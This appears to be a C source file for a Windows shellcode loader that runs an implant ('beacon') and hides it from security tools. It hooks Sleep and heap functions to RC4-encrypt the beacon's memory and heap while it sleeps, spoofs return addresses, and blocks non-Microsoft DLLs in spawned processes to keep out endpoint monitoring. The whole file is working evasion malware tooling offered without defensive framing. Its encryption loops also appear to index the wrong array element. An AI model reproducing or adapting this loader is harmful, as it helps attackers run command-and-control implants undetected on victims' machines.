#include "header.h"

fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
fnHeapCreate g_HeapCreate = (fnHeapCreate)GetProcAddress(GetModuleHandleA("kernel32.dll"), "HeapCreate");
fnGetProcessHeap g_GetProcessHeap = (fnGetProcessHeap)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessHeap");
fnCreateProcessA g_CreateProcessA = (fnCreateProcessA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
fnSleep g_Sleep = (fnSleep)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");

int main()

{
    g_dwBeaconBlocks = 0;

    g_hNewProcessHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0);

    g_ShellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(g_ShellcodeAddr, shellcode, sizeof(shellcode));
    memset(shellcode, 0, len);

    MH_Initialize();
    MH_CreateHook((PBYTE)&Sleep, &MySleep, (LPVOID*)&g_Sleep);
    MH_CreateHook((PBYTE)&HeapCreate, &MyHeapCreate, (LPVOID*)&g_HeapCreate);
    MH_CreateHook((PBYTE)&GetProcessHeap, &MyGetProcessHeap, (LPVOID*)&g_GetProcessHeap);
    MH_EnableHook((PBYTE)&GetProcessHeap);
    MH_EnableHook((PBYTE)&HeapCreate);
    MH_EnableHook((PBYTE)&Sleep);


    ((void(*)(void)) g_ShellcodeAddr)();

    return 0;
}

VOID RandomGen()
{
    BCryptGenRandom(NULL, g_EncryptKey, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    g_key.Buffer = g_EncryptKey;
    g_key.Length = 16;

    for (size_t i = 0; i < 16; i++)
    {
        printf("%x", g_key.Buffer[i]);
    }
    printf("\n");
}

VOID HeapEncrypt() {
    PROCESS_HEAP_ENTRY entry;

    SecureZeroMemory(&entry, sizeof(entry));
    HeapLock(g_hNewProcessHeap);
    while (HeapWalk(g_hNewProcessHeap, &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            g_data.Buffer = (PUCHAR)entry.lpData;
            g_data.Length = entry.cbData;
            SystemFunction033(&g_data, &g_key);
        }
    }
    HeapUnlock(g_hNewProcessHeap);
}

VOID BeaconEncrypt(BOOL fEncrypt) {
    SYSTEM_INFO info;
    MEMORY_BASIC_INFORMATION mbi;
    DWORD dwOld;
    SIZE_T CurrentAddr = 0;

    SecureZeroMemory(&info, sizeof(info));
    SecureZeroMemory(&mbi, sizeof(mbi));

    if (fEncrypt)
    {
        RandomGen();
        GetSystemInfo(&info);
        CurrentAddr = (SIZE_T)info.lpMinimumApplicationAddress;

        if (g_BeaconAddr != g_ShellcodeAddr)
        {
            try {
                VirtualFree(g_ShellcodeAddr, 0, MEM_RELEASE);
            }
            catch (...) {
            }
        }

        while (CurrentAddr < (SIZE_T)info.lpMaximumApplicationAddress)
        {
            VirtualQuery((LPCVOID)CurrentAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
            if (mbi.AllocationBase != g_BeaconAddr)
            {
                if (mbi.Type & MEM_PRIVATE && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize > 204800) {
                    VirtualFree(mbi.AllocationBase, 0, MEM_RELEASE);
                }
            }
            else
            {
                
                orgs[g_dwBeaconBlocks].BaseAddress = mbi.BaseAddress;
                orgs[g_dwBeaconBlocks].RegionSize = mbi.RegionSize;
                orgs[g_dwBeaconBlocks].Protect = mbi.Protect;
                g_dwBeaconBlocks += 1;
                printf("BaseAddr-->%p\n", mbi.BaseAddress);
                printf("RegionSize--> % d\n", mbi.RegionSize);
            }
            CurrentAddr += mbi.RegionSize;
        }

        for (SIZE_T i = 0; i < g_dwBeaconBlocks; i++)
        {
            VirtualProtect(orgs[g_dwBeaconBlocks].BaseAddress, orgs[g_dwBeaconBlocks].RegionSize, PAGE_READWRITE, &dwOld);
            g_data.Buffer = (PUCHAR)orgs[g_dwBeaconBlocks].BaseAddress;
            g_data.Length = orgs[g_dwBeaconBlocks].RegionSize;
            SystemFunction033(&g_data, &g_key);
        }
    }

    else
    {
        for (SIZE_T i = 0; i < g_dwBeaconBlocks; i++)
        {
            g_data.Buffer = (PUCHAR)orgs[g_dwBeaconBlocks].BaseAddress;
            g_data.Length = orgs[g_dwBeaconBlocks].RegionSize;
            SystemFunction033(&g_data, &g_key);
            VirtualProtect(orgs[g_dwBeaconBlocks].BaseAddress, orgs[g_dwBeaconBlocks].RegionSize, orgs[g_dwBeaconBlocks].Protect, &dwOld);
        }
        g_dwBeaconBlocks = 0;
    }
}

VOID WINAPI MySleep(DWORD SleepTime) {

    MEMORY_BASIC_INFORMATION mbi;

    SIZE_T* overwrite = (SIZE_T*)_AddressOfReturnAddress();
    SIZE_T origReturnAddress = *overwrite;
    *overwrite = 0;

    //MH_DisableHook((PBYTE)&Sleep);

    SecureZeroMemory(&mbi,sizeof(mbi));

    VirtualQuery((LPCVOID)origReturnAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
    g_BeaconAddr = mbi.AllocationBase;

    BeaconEncrypt(TRUE);
    HeapEncrypt();
    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hEvent, SleepTime);
    CloseHandle(hEvent);
    HeapEncrypt();
    BeaconEncrypt(FALSE);

    //MH_EnableHook((PBYTE)&Sleep);

    *overwrite = origReturnAddress;
}

BOOL WINAPI MyCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
    BOOL result;
    STARTUPINFOEXA si;
    SIZE_T dwSize = 0;
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    SIZE_T* overwrite = (SIZE_T*)_AddressOfReturnAddress();
    SIZE_T origReturnAddress = *overwrite;
    *overwrite = 0;

    //MH_DisableHook((PBYTE)&CreateProcessA);

    SecureZeroMemory(&si, sizeof(si));

    InitializeProcThreadAttributeList(NULL, 1, 0, &dwSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &dwSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    memcpy(&si.StartupInfo, lpStartupInfo, sizeof(STARTUPINFOA));
    result = g_CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, EXTENDED_STARTUPINFO_PRESENT | dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si.StartupInfo, lpProcessInformation);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    //MH_EnableHook((PBYTE)&CreateProcessA);

    *overwrite = origReturnAddress;
    return result;
}

HANDLE WINAPI MyHeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize) {

    HMODULE hModule;
    //HANDLE Tmp;

    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule))
    {
        printf("HeapCreateFrom-->%p\n", _ReturnAddress());
        printf("HeapAddr-->%p\n", g_hNewProcessHeap);
        return g_hNewProcessHeap;
    }

    /*
    MH_DisableHook((PBYTE)&HeapCreate);
    Tmp = HeapCreate(flOptions, dwInitialSize, dwMaximumSize);
    MH_EnableHook((PBYTE)&HeapCreate);
    */
    return g_HeapCreate(flOptions, dwInitialSize, dwMaximumSize);
}

HANDLE WINAPI MyGetProcessHeap() {

    HMODULE hModule;
    //HANDLE Tmp;

    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCSTR)_ReturnAddress(), &hModule))
    {
        printf("GetProcessHeapFrom-->%p\n", _ReturnAddress());
        printf("HeapAddr-->%p\n", g_hNewProcessHeap);
        return g_hNewProcessHeap;
    }
    /*
    MH_DisableHook((PBYTE)&GetProcessHeap);
    Tmp = GetProcessHeap();
    MH_EnableHook((PBYTE)&GetProcessHeap);
    */
    return g_GetProcessHeap();
}
